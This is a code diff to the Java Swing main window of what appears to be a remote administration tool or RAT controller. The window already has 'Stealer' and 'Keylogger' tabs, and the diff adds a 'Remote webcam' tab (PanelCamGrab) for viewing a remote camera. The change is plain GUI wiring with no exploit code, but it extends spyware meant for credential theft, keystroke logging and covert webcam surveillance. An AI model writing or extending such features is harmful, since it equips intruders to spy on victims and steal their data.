@@ -18,7 +18,7 @@ public class MainWindow extends JFrame
 {
 	private static final long serialVersionUID = -547796034497603735L;
 	
-	private int width = 790;
+	private int width = 830;
 	private int height = 460;
 	
 	private JPanel panel_logo;
@@ -36,6 +36,7 @@ public class MainWindow extends JFrame
 	public PanelFile panel_tab9;
 	public PanelStealer panel_tab10;
 	public PanelKeylogger panel_tab11;
+	public PanelCamGrab panel_tab12;
 	
 	public JTabbedPane pane_tabs;
 
@@ -69,6 +70,7 @@ public class MainWindow extends JFrame
 		createTab9();
 		createTab10();
 		createTab11();
+		createTab12();
 		addTabs();
 	}
 	
@@ -118,6 +120,11 @@ public class MainWindow extends JFrame
 	{
 		panel_tab3 = new PanelScreen();
 		panel_tab3.setPreferredSize(new Dimension(width, height));
+	}
+	
+	private void createTab12(){
+		panel_tab12 = new PanelCamGrab();
+		panel_tab12.setPreferredSize(new Dimension(width,height));
 	}
 	
 	private void createTab4()
@@ -203,6 +210,9 @@ public class MainWindow extends JFrame
 		
 		ImageIcon icon_tab11 = new ImageIcon(Utils.toByteArray(this.getClass().getClassLoader().getResourceAsStream("/images/keyboard.png")));
 		pane_tabs.addTab("Keylogger", icon_tab11, panel_tab11, "Remotely control what is typed on your computer");
+		
+		ImageIcon icon_tab12 = new ImageIcon(Utils.toByteArray(this.getClass().getClassLoader().getResourceAsStream("/images/capture.png")));
+		pane_tabs.addTab("Remote webcam", icon_tab12, panel_tab12, "View the remote webcam");
 		
 		getContentPane().add(pane_tabs, BorderLayout.CENTER);
 	}
